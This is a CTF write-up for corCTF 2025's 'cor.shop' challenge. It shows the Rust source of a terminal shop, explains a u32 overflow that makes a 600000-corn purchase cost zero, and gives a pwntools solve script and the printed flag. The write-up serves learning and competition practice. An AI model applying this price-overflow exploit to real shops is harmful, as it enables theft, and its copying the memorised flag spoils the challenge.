---
layout: post
title:  "cor.shop"
date:   2025-08-28 20:22:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /corctf-2025-corshop/
---

## cor.shop

**Title:** cor.shop

**Category:** misc

**Creator:** jazzpizazz

Who even uses GUIs anymore? As FizzBuzz101 once said so perfectly: “I don't believe in GUI.” People are finally waking up — ordering coffee over SSH, trading bloated Electron editors for the elegance of Neovim.

At CoR, we couldn't be happier to support this movement. That's why we built a fun little shop you can access right from your terminal, where you can snag personal items from CoR members themselves!

`nc ctfi.ng 31417 `

Connecting:
```shell
nc ctfi.ng 31417  
=====================================  
        Welcome to cor.shop    
=====================================  
Commands:  
 list                 - show products  
 buy <id> <qty>       - attempt to purchase  
 balance              - show your balance  
 help                 - show this help  
 quit                 - disconnect  
  
  
Balance: 0 corns  
> list  
ID  |   PRICE | NAME  
----+-------+------------------------------  
1   |  250000 | FizzBuzz101's tears  
2   |  400000 | One Clubby hair  
3   |  600000 | Day's Heap  
4   |       0 | cor.shop's source code  
>
```
Purchase the source code with `buy 4 1`.
{% raw %}
Source code:
```t
use std::env;  
use std::io::{self, BufRead, BufReader, Write};  
  
#[derive(Clone, Copy)]  
struct Item { id: u32, name: &'static str, price: u64 }  
  
fn items() -> Vec<Item> { vec![  
   Item { id: 1, name: "FizzBuzz101's tears", price: 250_000 },  
   Item { id: 2, name: "One Clubby hair", price: 400_000 },  
   Item { id: 3, name: "Day's Heap", price: 600_000 },  
   Item { id: 4, name: "cor.shop's source code", price: 0}  
]}  
  
fn banner() -> &'static str { r#"=====================================  
        Welcome to cor.shop    
=====================================  
Commands:  
 list                 - show products  
 buy <id> <qty>       - attempt to purchase  
 balance              - show your balance  
 help                 - show this help  
 quit                 - disconnect  
  
"# }  
  
const SOURCE: &str = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/", file!()));  
  
fn shop<R: BufRead, W: Write>(mut reader: R, mut writer: W, heap: &str) {  
   let mut balance: u64 = 0;  
   let _ = writeln!(writer, "{}", banner());  
   let _ = writeln!(writer, "Balance: {} corns", balance);  
  
   loop {  
       // Print prompt  
       let _ = write!(writer, "> ");  
       let _ = writer.flush();  
  
       // Read user input  
       let mut line = String::new();  
       if reader.read_line(&mut line).unwrap_or(0) == 0 { break; }  
       let line = line.trim();  
       if line.is_empty() { continue; }  
  
       // Parse out the command  
       let mut parts = line.split_whitespace();  
       let cmd = parts.next().unwrap_or("");  
  
       match cmd {  
           "list" => {  
               // List table of our items  
               let _ = writeln!(writer, "{:<3} | {:>7} | {}", "ID", "PRICE", "NAME");  
               let _ = writeln!(writer, "----+-------+------------------------------");  
               for it in items() {  
                   let _ = writeln!(writer, "{:<3} | {:>7} | {}", it.id, it.price, it.name);  
               }  
           }  
           "balance" => {  
               // Show the current balance in corns  
               let _ = writeln!(writer, "Balance: {} corns", balance);  
           }  
           "buy" => {  
               // Attempt to parse the id and quantity, else fall back to id 0 and qty 1.  
               let id: u32 = parts.next().and_then(|i| i.parse().ok()).unwrap_or(0);  
               let qty: u32 = parts.next().and_then(|q| q.parse().ok()).unwrap_or(1);  
  
               if qty == 0 {  
                   // ???  
                   let _ = writeln!(  
                       writer,  
                       "Thats not how buying stuff works.",  
                   );  
                   continue;  
               }  
  
               if let Some(item) = items().into_iter().find(|it| it.id == id) {  
                   // Calculate the total cost of this purchase  
                   let total: u64 = (item.price as u32 * qty) as u64;  
  
                   if balance >= total {  
                       // User can purchase, handle the purchase  
                       balance = balance - total;  
                       let _ = writeln!(  
                           writer,  
                           "Purchased {} x {} for {} corns.",  
                           qty, item.name, total  
                       );  
                       // We need to take quantities into account sometime but its not like people got any corn.  
                       if item.id == 1 {  
                           let _ = writeln!(  
                               writer,  
                               "(╥﹏╥)",  
                           );  
                       } else if item.id == 2 {  
                           let _ = writeln!(  
                               writer,  
                               "-ˋˏ✄┈┈┈┈",  
                           );  
                       } else if item.id == 3 {  
                           let _ = writeln!(  
                               writer,  
                               "{}",  
                               heap  
                           );  
                       } else if item.id == 4 {  
                           let _ = writeln!(  
                               writer,  
                               "{}",  
                               SOURCE  
                           );  
                       }  
                   } else {  
                       // User should seriously invest in some corns  
                       let _ = writeln!(  
                           writer,  
                           "Insufficient balance. Need {}, have {}.",  
                           total, balance  
                       );  
                   }  
               } else {  
                   // I mean this is what we get for only having 3 products...  
                   let _ = writeln!(writer, "Unknown item id. Try `list`.");  
               }  
           }  
           "help" => { let _ = writeln!(writer, "{}", banner()); }  
           "quit" | "exit" => { let _ = writeln!(writer, "bye!"); break; }  
           _ => { let _ = writeln!(writer, "Unknown command. Try `help`."); }  
       }  
   }  
}  
  
fn main() -> io::Result<()> {  
   let heap = env::var("HEAP").unwrap_or_else(|_| "Got some random garbage, are you running this on your own machine or something?".to_string());  
   let stdin = io::stdin();  
   let stdout = io::stdout();  
   let reader = BufReader::new(stdin.lock());  
   let writer = stdout.lock();  
   shop(reader, writer, &heap);  
   Ok(())  
}
```
{% endraw %}
`qty` starts as a u32. I read about that here: [https://docs.w3cub.com/rust/std/primitive.u32.html](https://docs.w3cub.com/rust/std/primitive.u32.html)

Total is caculated as: `let total: u64 = (item.price as u32 * qty) as u64;`. It uses u32 arithmetic (32 bit unsigned integer) before casting to u64. 

I want to buy the `Day's Heap` which costs 600000. I want `balance >= total` to succeed. Currently `balance = 0` so I need `total = 0`. 

I need to solve for quantity:
```shell
(item.price * qty) % 2^32 = 0
600000 * qty = 0 (mod 2^32)
```

Quickly find the greatest common divisor:
```python
python3  
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import math  
>>> a = 600000  
>>> b = 2**32  
>>> gcd = math.gcd(a, b)  
>>> print(gcd)  
64  
>>> exit()
```

```shell
qty = 2^32 / 64 = 67108864
total = (600000 * 67108864) % 2^32 = 0
```
Because the multiplication happens in u32 it wraps around modulo `2^32` allowing a large `qty` to result in `total = 0` even though `balance = 0`.

Ok good. Buy the heap:
```shell
> buy 3 67108864  
Purchased 67108864 x Day's Heap for 0 corns.  
0x804b000:      0x00000000      0x00000069      0x63726f63      0x737b6674  
0x804b010:      0x72707275      0x5f337331      0x5f737431      0x70617277  
0x804b020:      0x5f643370      0x5f646e34      0x33337266      0x0000007d  
0x804b030:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b040:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b050:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b060:      0x00000000      0x00000000      0x00000068      0x00000069  
0x804b070:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b080:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b090:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b0a0:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b0b0:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b0c0:      0x00000000      0x00000000      0x00000000      0x00000000  
0x804b0d0:      0x00000000      0x00020f31      0x00000000      0x00000000  
0x804b0e0:      0x00000000      0x00000000      0x00000000      0x00000000
```

Remove the memory addresses and put the rest into [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)Find_/_Replace(%7B'option':'Regex','string':'0x'%7D,'',true,false,true,true)From_Hex('Auto')&input=MHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwNjkgoKCgoKAweDYzNzI2ZjYzIKCgoKCgMHg3MzdiNjY3NCAgCjB4NzI3MDcyNzUgoKCgoKAweDVmMzM3MzMxIKCgoKCgMHg1ZjczNzQzMSCgoKCgoDB4NzA2MTcyNzcgIAoweDVmNjQzMzcwIKCgoKCgMHg1ZjY0NmUzNCCgoKCgoDB4MzMzMzcyNjYgoKCgoKAweDAwMDAwMDdkICAKMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCAgCjB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgIAoweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwICAKMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDY4IKCgoKCgMHgwMDAwMDA2OSAgCjB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgIAoweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwICAKMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCAgCjB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgIAoweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwICAKMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCAgCjB4MDAwMDAwMDAgoKCgoKAweDAwMDIwZjMxIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgIAoweDAwMDAwMDAwIKCgoKCgMHgwMDAwMDAwMCCgoKCgoDB4MDAwMDAwMDAgoKCgoKAweDAwMDAwMDAw&oeol=CR). Run the recipe `swap endianness` then `find/replace 0x with nothing`, and `from hex`.

Or run a python script:
```python
from pwn import remote
import re

io = remote("ctfi.ng", 31417)
io.recvuntil(b"> ")

qty = 2**32 // 64
io.sendline(f"buy 3 {qty}".encode())
data = io.recvall(timeout=5).decode(errors='ignore')

# extract 8 digit hex values
hexnumbers = re.findall(r'0x([0-9a-fA-F]{8})', data)

# swap endianness
swapped_bytes = b''.join(bytes.fromhex(h)[::-1] for h in hexnumbers)

# only printable ASCII chars
flag = ''.join(chr(b) for b in swapped_bytes if 32 <= b <= 126)
print(flag)
```

Output:
```shell
python3 solve.py  
[+] Opening connection to ctfi.ng on port 31417: Done  
[+] Receiving all data: Done (1.31KB)  
[*] Closed connection to ctfi.ng port 31417  
icorctf{surpr1s3_1ts_wrapp3d_4nd_fr33}hi1
```

`corctf{surpr1s3_1ts_wrapp3d_4nd_fr33}`

___
